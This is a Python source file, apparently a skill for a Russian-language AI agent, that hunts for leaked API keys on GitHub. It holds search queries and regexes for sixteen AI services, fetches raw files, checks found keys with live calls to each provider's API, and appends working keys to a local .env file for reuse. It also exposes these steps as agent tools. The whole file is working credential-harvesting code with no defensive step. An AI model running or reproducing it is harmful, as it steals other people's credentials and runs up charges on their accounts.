# osint_key_hunter/skill.py v1.0.0
# Автоматический охотник за API-ключами через GitHub Code Search
# Шаблонный поиск + валидация + автосохранение в .env
# 
# Идея шаблонов: api_key=sk-+"SERVICE" — от Юры

import json, re, os, sys, time, asyncio
from pathlib import Path
from datetime import datetime, timedelta
from typing import Optional, Dict, List, Tuple, Any
from dataclasses import dataclass, field

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
from utils import run_async

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

# ── Пути ─────────────────────────────────────────────────────────────────
_CUSTOM_DIR = Path(__file__).parent.parent  # skills/custom/
_ENV = _CUSTOM_DIR / ".env"
_RESULTS_FILE = Path(__file__).parent / "hunt_results.json"

# ── GitHub токен (из .env) ──────────────────────────────────────────────
def _load_github_token() -> Optional[str]:
    """Загружает GITHUB_TOKEN из .env."""
    try:
        if _ENV.exists():
            for line in _ENV.read_text(encoding='utf-8').split('\n'):
                line = line.strip()
                if line.startswith('GITHUB_TOKEN='):
                    return line.split('=', 1)[1].strip().strip('"').strip("'")
    except Exception:
        pass
    return None

GITHUB_TOKEN = _load_github_token()

# ═══════════════════════════════════════════════════════════════════════════
# ███  КОНФИГУРАЦИЯ СЕРВИСОВ  ██████████████████████████████████████████████
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class ServiceConfig:
    """Конфигурация поиска для одного сервиса."""
    name: str                           # Название (DeepSeek, OpenAI, ...)
    key_prefix: str                     # Префикс ключа: sk-, sk-proj-, sk-ant-, AIza, gsk_, hf_, ...
    env_var: str                        # Переменная окружения: DEEPSEEK_API_KEY
    search_queries: List[str]           # GitHub-запросы
    key_pattern: str                    # Регулярка для извлечения ключа
    validation_url: str                 # URL для валидации
    validation_ok_statuses: List[int]   # HTTP-статусы, означающие что ключ валиден (не 401)
    validation_error_field: str         # Поле в ответе для доп.проверки (например "error")

# ═══════════════════════════════════════════════════════════════════════════
# ███  КАТАЛОГ СЕРВИСОВ (16+)  ██████████████████████████████████████████████
# ═══════════════════════════════════════════════════════════════════════════

SERVICES: Dict[str, ServiceConfig] = {
    'DeepSeek': ServiceConfig(
        name='DeepSeek',
        key_prefix='sk-',
        env_var='DEEPSEEK_API_KEY',
        search_queries=[
            'api_key=sk- DEEPSEEK language:python',
            'DEEPSEEK_API_KEY sk- language:python',
            '"deepseek" "api_key" "sk-" language:python',
            '"DEEPSEEK_API_KEY" "sk-" NOT "sk-xxx" NOT "sk-your"',
            'api_key = "sk-" deepseek',
        ],
        key_pattern=r'(?:DEEPSEEK_API_KEY|api_key|deepseek_key)\s*[:=]\s*["\']?(sk-[a-zA-Z0-9]{32,48})["\']?',
        validation_url='https://api.deepseek.com/v1/chat/completions',
        validation_ok_statuses=[200, 400, 422],  # 400/422 = ключ валиден, но запрос плохой
        validation_error_field='error',
    ),
    'OpenAI': ServiceConfig(
        name='OpenAI',
        key_prefix='sk-proj-',
        env_var='OPENAI_API_KEY',
        search_queries=[
            'OPENAI_API_KEY sk-proj- language:python',
            'api_key=sk-proj- openai language:python',
            '"OPENAI_API_KEY" "sk-proj-" NOT "sk-proj-xxx"',
            'openai.api_key = "sk-proj-"',
        ],
        key_pattern=r'(?:OPENAI_API_KEY|api_key|openai_key)\s*[:=]\s*["\']?(sk-(?:proj-|svcacct-|admin-)?[a-zA-Z0-9]{32,160})["\']?',
        validation_url='https://api.openai.com/v1/models',
        validation_ok_statuses=[200],
        validation_error_field='error',
    ),
    'Anthropic': ServiceConfig(
        name='Anthropic',
        key_prefix='sk-ant-',
        env_var='ANTHROPIC_API_KEY',
        search_queries=[
            'ANTHROPIC_API_KEY sk-ant- language:python',
            'api_key=sk-ant- anthropic language:python',
            '"ANTHROPIC_API_KEY" "sk-ant-" NOT "sk-ant-xxx"',
        ],
        key_pattern=r'(?:ANTHROPIC_API_KEY|api_key|anthropic_key)\s*[:=]\s*["\']?(sk-ant-[a-zA-Z0-9]{32,64})["\']?',
        validation_url='https://api.anthropic.com/v1/messages',
        validation_ok_statuses=[200, 400, 422],
        validation_error_field='error',
    ),
    'Google Gemini': ServiceConfig(
        name='Google Gemini',
        key_prefix='AIza',
        env_var='GEMINI_API_KEY',
        search_queries=[
            'GEMINI_API_KEY AIza language:python',
            'GOOGLE_API_KEY AIza language:python',
            '"gemini" "api_key" "AIza" language:python',
            'genai.configure api_key AIza',
        ],
        key_pattern=r'(?:GEMINI_API_KEY|GOOGLE_API_KEY|api_key)\s*[:=]\s*["\']?(AIza[a-zA-Z0-9_-]{35})["\']?',
        validation_url='https://generativelanguage.googleapis.com/v1beta/models?key={key}',
        validation_ok_statuses=[200],
        validation_error_field='error',
    ),
    'Groq': ServiceConfig(
        name='Groq',
        key_prefix='gsk_',
        env_var='GROQ_API_KEY',
        search_queries=[
            'GROQ_API_KEY gsk_ language:python',
            'api_key=gsk_ groq language:python',
            '"groq" "api_key" "gsk_"',
        ],
        key_pattern=r'(?:GROQ_API_KEY|api_key|groq_key)\s*[:=]\s*["\']?(gsk_[a-zA-Z0-9]{32,64})["\']?',
        validation_url='https://api.groq.com/openai/v1/models',
        validation_ok_statuses=[200],
        validation_error_field='error',
    ),
    'ElevenLabs': ServiceConfig(
        name='ElevenLabs',
        key_prefix='',
        env_var='ELEVENLABS_API_KEY',
        search_queries=[
            'ELEVENLABS_API_KEY language:python',
            '"elevenlabs" "api_key" language:python',
        ],
        key_pattern=r'(?:ELEVENLABS_API_KEY|api_key|elevenlabs_key)\s*[:=]\s*["\']?([a-f0-9]{32,64})["\']?',
        validation_url='https://api.elevenlabs.io/v1/user',
        validation_ok_statuses=[200],
        validation_error_field='detail',
    ),
    'Perplexity': ServiceConfig(
        name='Perplexity',
        key_prefix='pplx-',
        env_var='PERPLEXITY_API_KEY',
        search_queries=[
            'PERPLEXITY_API_KEY pplx- language:python',
            '"perplexity" "api_key" "pplx-"',
            'api_key=pplx- language:python',
        ],
        key_pattern=r'(?:PERPLEXITY_API_KEY|api_key)\s*[:=]\s*["\']?(pplx-[a-zA-Z0-9]{32,64})["\']?',
        validation_url='https://api.perplexity.ai/chat/completions',
        validation_ok_statuses=[200, 400, 422],
        validation_error_field='error',
    ),
    'Mistral': ServiceConfig(
        name='Mistral',
        key_prefix='',
        env_var='MISTRAL_API_KEY',
        search_queries=[
            'MISTRAL_API_KEY language:python',
            '"mistral" "api_key" language:python',
        ],
        key_pattern=r'(?:MISTRAL_API_KEY|api_key|mistral_key)\s*[:=]\s*["\']?([a-zA-Z0-9]{32,64})["\']?',
        validation_url='https://api.mistral.ai/v1/models',
        validation_ok_statuses=[200],
        validation_error_field='message',
    ),
    'Cohere': ServiceConfig(
        name='Cohere',
        key_prefix='',
        env_var='COHERE_API_KEY',
        search_queries=[
            'COHERE_API_KEY language:python',
            '"cohere" "api_key" language:python',
        ],
        key_pattern=r'(?:COHERE_API_KEY|api_key|cohere_key)\s*[:=]\s*["\']?([a-zA-Z0-9]{32,64})["\']?',
        validation_url='https://api.cohere.ai/v1/check-api-key',
        validation_ok_statuses=[200],
        validation_error_field='message',
    ),
    'Together AI': ServiceConfig(
        name='Together AI',
        key_prefix='',
        env_var='TOGETHER_API_KEY',
        search_queries=[
            'TOGETHER_API_KEY language:python',
            '"together" "api_key" language:python',
        ],
        key_pattern=r'(?:TOGETHER_API_KEY|api_key|together_key)\s*[:=]\s*["\']?([a-f0-9]{32,64})["\']?',
        validation_url='https://api.together.xyz/v1/models',
        validation_ok_statuses=[200],
        validation_error_field='error',
    ),
    'Hugging Face': ServiceConfig(
        name='Hugging Face',
        key_prefix='hf_',
        env_var='HUGGINGFACE_API_KEY',
        search_queries=[
            'HUGGINGFACE_API_KEY hf_ language:python',
            '"huggingface" "api_key" "hf_"',
            'api_key=hf_ language:python',
        ],
        key_pattern=r'(?:HUGGINGFACE_API_KEY|api_key|hf_key|HF_TOKEN)\s*[:=]\s*["\']?(hf_[a-zA-Z0-9]{32,64})["\']?',
        validation_url='https://huggingface.co/api/whoami-v2',
        validation_ok_statuses=[200],
        validation_error_field='error',
    ),
    'Replicate': ServiceConfig(
        name='Replicate',
        key_prefix='r8_',
        env_var='REPLICATE_API_KEY',
        search_queries=[
            'REPLICATE_API_KEY r8_ language:python',
            '"replicate" "api_key" "r8_"',
        ],
        key_pattern=r'(?:REPLICATE_API_KEY|api_key|replicate_key|REPLICATE_API_TOKEN)\s*[:=]\s*["\']?(r8_[a-zA-Z0-9]{32,64})["\']?',
        validation_url='https://api.replicate.com/v1/account',
        validation_ok_statuses=[200],
        validation_error_field='detail',
    ),
    'Stability AI': ServiceConfig(
        name='Stability AI',
        key_prefix='sk-',
        env_var='STABILITY_API_KEY',
        search_queries=[
            'STABILITY_API_KEY sk- language:python',
            '"stability" "api_key" "sk-"',
        ],
        key_pattern=r'(?:STABILITY_API_KEY|api_key|stability_key)\s*[:=]\s*["\']?(sk-[a-zA-Z0-9]{32,64})["\']?',
        validation_url='https://api.stability.ai/v1/user/account',
        validation_ok_statuses=[200],
        validation_error_field='message',
    ),
    'Fireworks AI': ServiceConfig(
        name='Fireworks AI',
        key_prefix='',
        env_var='FIREWORKS_API_KEY',
        search_queries=[
            'FIREWORKS_API_KEY language:python',
            '"fireworks" "api_key" language:python',
        ],
        key_pattern=r'(?:FIREWORKS_API_KEY|api_key|fireworks_key)\s*[:=]\s*["\']?([a-zA-Z0-9]{32,64})["\']?',
        validation_url='https://api.fireworks.ai/inference/v1/models',
        validation_ok_statuses=[200],
        validation_error_field='error',
    ),
    'Lepton AI': ServiceConfig(
        name='Lepton AI',
        key_prefix='',
        env_var='LEPTON_API_KEY',
        search_queries=[
            'LEPTON_API_KEY language:python',
            '"lepton" "api_key" language:python',
        ],
        key_pattern=r'(?:LEPTON_API_KEY|api_key|lepton_key)\s*[:=]\s*["\']?([a-zA-Z0-9]{32,64})["\']?',
        validation_url='https://api.lepton.ai/v1/models',
        validation_ok_statuses=[200],
        validation_error_field='error',
    ),
    'OpenRouter': ServiceConfig(
        name='OpenRouter',
        key_prefix='sk-or-',
        env_var='OPENROUTER_API_KEY',
        search_queries=[
            'OPENROUTER_API_KEY sk-or- language:python',
            '"openrouter" "api_key" "sk-or-"',
            'api_key=sk-or- language:python',
        ],
        key_pattern=r'(?:OPENROUTER_API_KEY|api_key|openrouter_key)\s*[:=]\s*["\']?(sk-or-[a-zA-Z0-9]{32,64})["\']?',
        validation_url='https://openrouter.ai/api/v1/models',
        validation_ok_statuses=[200],
        validation_error_field='error',
    ),
}

# ═══════════════════════════════════════════════════════════════════════════
# ███  ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ  ████████████████████████████████████████████
# ═══════════════════════════════════════════════════════════════════════════

def _load_results() -> Dict:
    """Загружает сохранённые результаты охоты."""
    if _RESULTS_FILE.exists():
        try:
            return json.loads(_RESULTS_FILE.read_text(encoding='utf-8'))
        except Exception:
            pass
    return {'last_hunt': None, 'hunts': []}

def _save_results(data: Dict):
    """Сохраняет результаты."""
    _RESULTS_FILE.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding='utf-8')

def _search_github_sync(query: str, max_pages: int = 3) -> List[Dict]:
    """Синхронный поиск через GitHub Code Search API. Возвращает список сниппетов."""
    if not HAS_HTTPX:
        return [{'error': 'httpx не установлен'}]
    
    results = []
    headers = {
        'Accept': 'application/vnd.github.v3+json',
        'User-Agent': 'osint-key-hunter/1.0',
    }
    if GITHUB_TOKEN:
        headers['Authorization'] = f'Bearer {GITHUB_TOKEN}'
    
    try:
        with httpx.Client(timeout=30.0, follow_redirects=True) as client:
            for page in range(1, max_pages + 1):
                url = f'https://api.github.com/search/code?q={query}&per_page=30&page={page}'
                resp = client.get(url, headers=headers)
                
                if resp.status_code == 403:
                    # Rate limit
                    break
                elif resp.status_code != 200:
                    break
                
                data = resp.json()
                items = data.get('items', [])
                if not items:
                    break
                
                for item in items:
                    results.append({
                        'repo': item['repository']['full_name'],
                        'path': item['path'],
                        'url': item['html_url'],
                        'score': item.get('score', 0),
                    })
                
                if len(items) < 30:
                    break
                
                time.sleep(2)  # Respect rate limits
    except Exception as e:
        return [{'error': str(e)}]
    
    return results

def _fetch_file_content(url: str) -> Optional[str]:
    """Загружает содержимое файла с GitHub raw."""
    raw_url = url.replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
    try:
        with httpx.Client(timeout=15.0, follow_redirects=True) as client:
            resp = client.get(raw_url)
            if resp.status_code == 200:
                return resp.text
    except Exception:
        pass
    return None

def _extract_keys_from_text(text: str, service: ServiceConfig) -> List[str]:
    """Извлекает ключи из текста по регулярке сервиса."""
    keys = []
    matches = re.findall(service.key_pattern, text, re.IGNORECASE)
    
    # Дополнительно: ищем простые присваивания с префиксом
    if service.key_prefix:
        # Простой паттерн: любая строка с префиксом
        simple_pattern = rf'["\']?({re.escape(service.key_prefix)}[a-zA-Z0-9_\-]{{20,160}})["\']?'
        extra_matches = re.findall(simple_pattern, text)
        matches.extend(extra_matches)
    
    seen = set()
    for key in matches:
        key = key.strip().strip('"').strip("'")
        # Фильтруем плейсхолдеры
        if any(p in key.lower() for p in ['xxx', 'your_', 'placeholder', 'example', 'test_', 'sk-your', 'sk-xxx']):
            continue
        # Проверяем минимальную длину
        if len(key) < 20:
            continue
        # Проверяем что ключ не похож на путь к файлу
        if '/' in key or '\\' in key:
            continue
        if key not in seen:
            seen.add(key)
            keys.append(key)
    
    return keys

def _validate_key_sync(key: str, service: ServiceConfig) -> Tuple[bool, str]:
    """Проверяет ключ через реальный API. Возвращает (валиден, статус)."""
    if not HAS_HTTPX:
        return False, 'no httpx'
    
    headers = {
        'User-Agent': 'osint-key-hunter/1.0',
        'Content-Type': 'application/json',
    }
    
    # Формируем запрос в зависимости от сервиса
    try:
        with httpx.Client(timeout=15.0, follow_redirects=True) as client:
            if service.name == 'DeepSeek':
                headers['Authorization'] = f'Bearer {key}'
                resp = client.post(
                    service.validation_url,
                    headers=headers,
                    json={
                        'model': 'deepseek-chat',
                        'messages': [{'role': 'user', 'content': 'hi'}],
                        'max_tokens': 1,
                    }
                )
            elif service.name == 'OpenAI':
                headers['Authorization'] = f'Bearer {key}'
                resp = client.get(service.validation_url, headers=headers)
            elif service.name == 'Anthropic':
                headers['x-api-key'] = key
                headers['anthropic-version'] = '2023-06-01'
                resp = client.post(
                    service.validation_url,
                    headers=headers,
                    json={
                        'model': 'claude-3-haiku-20240307',
                        'max_tokens': 1,
                        'messages': [{'role': 'user', 'content': 'hi'}],
                    }
                )
            elif service.name == 'Google Gemini':
                url = service.validation_url.replace('{key}', key)
                resp = client.get(url)
            elif service.name == 'Groq':
                headers['Authorization'] = f'Bearer {key}'
                resp = client.get(service.validation_url, headers=headers)
            elif service.name == 'ElevenLabs':
                headers['xi-api-key'] = key
                resp = client.get(service.validation_url, headers=headers)
            elif service.name == 'Perplexity':
                headers['Authorization'] = f'Bearer {key}'
                resp = client.post(
                    service.validation_url,
                    headers=headers,
                    json={
                        'model': 'sonar',
                        'messages': [{'role': 'user', 'content': 'hi'}],
                        'max_tokens': 1,
                    }
                )
            elif service.name == 'Mistral':
                headers['Authorization'] = f'Bearer {key}'
                resp = client.get(service.validation_url, headers=headers)
            elif service.name == 'Cohere':
                headers['Authorization'] = f'Bearer {key}'
                resp = client.post(service.validation_url, headers=headers, json={'model': 'command'})
            elif service.name == 'Together AI':
                headers['Authorization'] = f'Bearer {key}'
                resp = client.get(service.validation_url, headers=headers)
            elif service.name == 'Hugging Face':
                headers['Authorization'] = f'Bearer {key}'
                resp = client.get(service.validation_url, headers=headers)
            elif service.name == 'Replicate':
                headers['Authorization'] = f'Token {key}'
                resp = client.get(service.validation_url, headers=headers)
            elif service.name == 'Stability AI':
                headers['Authorization'] = f'Bearer {key}'
                resp = client.get(service.validation_url, headers=headers)
            elif service.name == 'Fireworks AI':
                headers['Authorization'] = f'Bearer {key}'
                resp = client.get(service.validation_url, headers=headers)
            elif service.name == 'Lepton AI':
                headers['Authorization'] = f'Bearer {key}'
                resp = client.get(service.validation_url, headers=headers)
            elif service.name == 'OpenRouter':
                headers['Authorization'] = f'Bearer {key}'
                resp = client.get(service.validation_url, headers=headers)
            else:
                return False, 'unknown service'
            
            status = resp.status_code
            if status in service.validation_ok_statuses:
                return True, f'OK ({status})'
            elif status == 401:
                return False, 'invalid (401)'
            elif status == 403:
                return False, 'forbidden (403)'
            elif status == 402:
                return True, f'valid but no funds (402)'  # Ключ валиден, но нет средств
            elif status == 429:
                return False, 'rate limited (429)'
            else:
                # Для некоторых сервисов даже 400 означает что ключ распознан
                body = resp.text[:200] if resp.text else ''
                return False, f'status {status}: {body}'
    except Exception as e:
        return False, f'error: {str(e)[:100]}'

def _save_key_to_env(service_name: str, key: str):
    """Сохраняет ключ в .env файл."""
    env_var = SERVICES.get(service_name, ServiceConfig(
        name=service_name, key_prefix='', env_var=f'{service_name.upper().replace(" ","_")}_API_KEY',
        search_queries=[], key_pattern='', validation_url='', validation_ok_statuses=[], validation_error_field=''
    )).env_var
    
    try:
        if _ENV.exists():
            lines = _ENV.read_text(encoding='utf-8').split('\n')
        else:
            lines = []
        
        # Проверяем, нет ли уже такого ключа
        for line in lines:
            if line.startswith(f'{env_var}=') and key in line:
                return False  # Уже есть
        
        # Добавляем
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M')
        new_line = f'{env_var}={key}  # found by osint_key_hunter {timestamp}'
        lines.append(new_line)
        
        _ENV.write_text('\n'.join(lines), encoding='utf-8')
        return True
    except Exception as e:
        return False

# ═══════════════════════════════════════════════════════════════════════════
# ███  ИНСТРУМЕНТЫ (tool-функции)  ██████████████████████████████████████████
# ═══════════════════════════════════════════════════════════════════════════

try:
    from autogen.beta import tools

    @tools.tool
    def hunt_keys_github(
        services: str = "all",
        validate: bool = True,
        auto_save: bool = True,
        max_pages_per_query: int = 2,
    ) -> str:
        """Автоматическая охота за API-ключами через GitHub Code Search.

        Использует шаблонный поиск (api_key=sk-+"SERVICE") для поиска утёкших ключей.
        Опционально валидирует найденные ключи и сохраняет рабочие в .env.

        Args:
            services: 'all' — все 16 сервисов. Или конкретный: 'DeepSeek', 'OpenAI', 'Anthropic', 'Gemini', 'Groq', 'ElevenLabs', 'Perplexity', 'Mistral', 'Cohere', 'Together AI', 'Hugging Face', 'Replicate', 'Stability AI', 'Fireworks AI', 'Lepton AI', 'OpenRouter'
            validate: Валидировать ключи через реальный API
            auto_save: Автосохранение рабочих ключей в .env
            max_pages_per_query: Страниц GitHub-результатов на запрос (1-5)

        Returns:
            Отчёт об охоте: найдено, проверено, рабочие, сохранённые
        """
        if not HAS_HTTPX:
            return "❌ Ошибка: httpx не установлен. Установи: pip install httpx"

        # Выбираем сервисы
        if services.lower() == 'all':
            targets = list(SERVICES.keys())
        else:
            targets = [s.strip() for s in services.split(',')]
            targets = [s for s in targets if s in SERVICES]
            if not targets:
                return f"❌ Сервис не найден. Доступны: {', '.join(SERVICES.keys())}"

        report = []
        report.append(f"🔍 OSINT Key Hunter — охота начата!")
        report.append(f"   Сервисов: {len(targets)}")
        report.append(f"   Валидация: {'да' if validate else 'нет'}")
        report.append(f"   Автосохранение: {'да' if auto_save else 'нет'}")
        report.append(f"   GitHub токен: {'✅ есть' if GITHUB_TOKEN else '❌ нет (ограниченный лимит)'}")
        report.append("")

        total_found = 0
        total_valid = 0
        total_saved = 0
        hunt_record = {'timestamp': datetime.now().isoformat(), 'results': {}}

        for service_name in targets:
            service = SERVICES[service_name]
            report.append(f"▸ {service_name}...")
            
            all_keys = set()
            
            for query in service.search_queries:
                try:
                    snippets = _search_github_sync(query, max_pages=max_pages_per_query)
                except Exception as e:
                    report.append(f"  ⚠ Поиск: {query[:50]}... — ошибка: {e}")
                    continue
                
                if not snippets:
                    continue
                
                if 'error' in snippets[0]:
                    report.append(f"  ⚠ {snippets[0]['error']}")
                    continue
                
                # Для каждого сниппета загружаем содержимое
                for snippet in snippets[:5]:  # Ограничиваем для скорости
                    content = _fetch_file_content(snippet['url'])
                    if content:
                        keys = _extract_keys_from_text(content, service)
                        for k in keys:
                            all_keys.add(k)
                            total_found += 1
                
                time.sleep(1)  # Уважаем GitHub API
            
            report.append(f"  Найдено ключей: {len(all_keys)}")
            
            # Валидация
            valid_keys = []
            if validate and all_keys:
                for key in list(all_keys)[:10]:  # Не больше 10 на сервис
                    is_valid, status = _validate_key_sync(key, service)
                    if is_valid:
                        valid_keys.append((key, status))
                        total_valid += 1
                        report.append(f"  ✅ {key[:20]}...{key[-8:]} — {status}")
                        
                        # Автосохранение
                        if auto_save:
                            if _save_key_to_env(service_name, key):
                                total_saved += 1
                                report.append(f"     💾 Сохранён в .env")
                    else:
                        report.append(f"  ❌ {key[:20]}...{key[-8:]} — {status}")
            
            hunt_record['results'][service_name] = {
                'found': len(all_keys),
                'valid': len(valid_keys),
                'keys': [{'key': k[:15]+'...', 'status': s} for k, s in valid_keys],
            }
        
        # Сохраняем отчёт
        all_results = _load_results()
        all_results['last_hunt'] = datetime.now().isoformat()
        all_results['hunts'].append(hunt_record)
        _save_results(all_results)
        
        report.append("")
        report.append("═" * 50)
        report.append(f"🎯 ИТОГО:")
        report.append(f"   Найдено ключей: {total_found}")
        report.append(f"   Валидных: {total_valid}")
        report.append(f"   Сохранено в .env: {total_saved}")
        report.append(f"   Отчёт: hunt_results.json")
        
        return '\n'.join(report)

    @tools.tool
    def hunt_single_service(service: str) -> str:
        """Быстрая охота по одному сервису. Поиск + извлечение ключей без валидации.

        Args:
            service: Название сервиса (DeepSeek, OpenAI, ...)

        Returns:
            Список найденных ключей
        """
        if service not in SERVICES:
            return f"❌ Сервис '{service}' не найден. Доступны: {', '.join(SERVICES.keys())}"
        
        svc = SERVICES[service]
        all_keys = set()
        
        for query in svc.search_queries:
            snippets = _search_github_sync(query, max_pages=2)
            if not snippets or 'error' in snippets[0]:
                continue
            
            for snippet in snippets[:3]:
                content = _fetch_file_content(snippet['url'])
                if content:
                    keys = _extract_keys_from_text(content, svc)
                    for k in keys:
                        all_keys.add(k)
                time.sleep(0.5)
        
        if not all_keys:
            return f"🔍 {service}: ключей не найдено."
        
        result = f"🔍 {service}: найдено {len(all_keys)} ключей:\n"
        for k in sorted(all_keys):
            result += f"  • {k[:25]}...{k[-10:]}\n"
        
        return result

    @tools.tool
    def validate_key(key: str, service: str) -> str:
        """Проверить один ключ через реальный API сервиса.

        Args:
            key: API-ключ для проверки
            service: Сервис (DeepSeek, OpenAI, ...)

        Returns:
            Результат валидации
        """
        if service not in SERVICES:
            return f"❌ Сервис '{service}' не найден."
        
        svc = SERVICES[service]
        is_valid, status = _validate_key_sync(key, svc)
        
        if is_valid:
            return f"✅ {service}: ключ {key[:15]}... ВАЛИДЕН ({status})"
        else:
            return f"❌ {service}: ключ {key[:15]}... НЕ ВАЛИДЕН ({status})"

    @tools.tool
    def hunt_status() -> str:
        """Статус последней охоты: статистика, найденные ключи, время.

        Returns:
            Отчёт о последней охоте
        """
        data = _load_results()
        if not data.get('last_hunt'):
            return "📭 Охота ещё не запускалась. Скажи «Аура, запускай охоту за ключами»."
        
        last = data['last_hunt']
        hunts = data.get('hunts', [])
        last_hunt = hunts[-1] if hunts else None
        
        result = f"📊 Последняя охота: {last}\n"
        
        if last_hunt:
            total_found = sum(r.get('found', 0) for r in last_hunt['results'].values())
            total_valid = sum(r.get('valid', 0) for r in last_hunt['results'].values())
            result += f"   Найдено: {total_found}\n"
            result += f"   Валидных: {total_valid}\n"
            result += f"   Сервисов проверено: {len(last_hunt['results'])}\n\n"
            
            for svc, info in last_hunt['results'].items():
                if info['valid'] > 0:
                    result += f"  ✅ {svc}: {info['valid']} рабочих из {info['found']}\n"
                elif info['found'] > 0:
                    result += f"  🔍 {svc}: {info['found']} найдено, 0 рабочих\n"
        
        result += f"\n   Всего охот: {len(hunts)}"
        return result

except ImportError:
    # Если autogen.beta недоступен — определяем заглушки
    def hunt_keys_github(*args, **kwargs):
        return "osint_key_hunter: autogen.beta.tools недоступен"
    def hunt_single_service(*args, **kwargs):
        return "osint_key_hunter: autogen.beta.tools недоступен"
    def validate_key(*args, **kwargs):
        return "osint_key_hunter: autogen.beta.tools недоступен"
    def hunt_status(*args, **kwargs):
        return "osint_key_hunter: autogen.beta.tools недоступен"
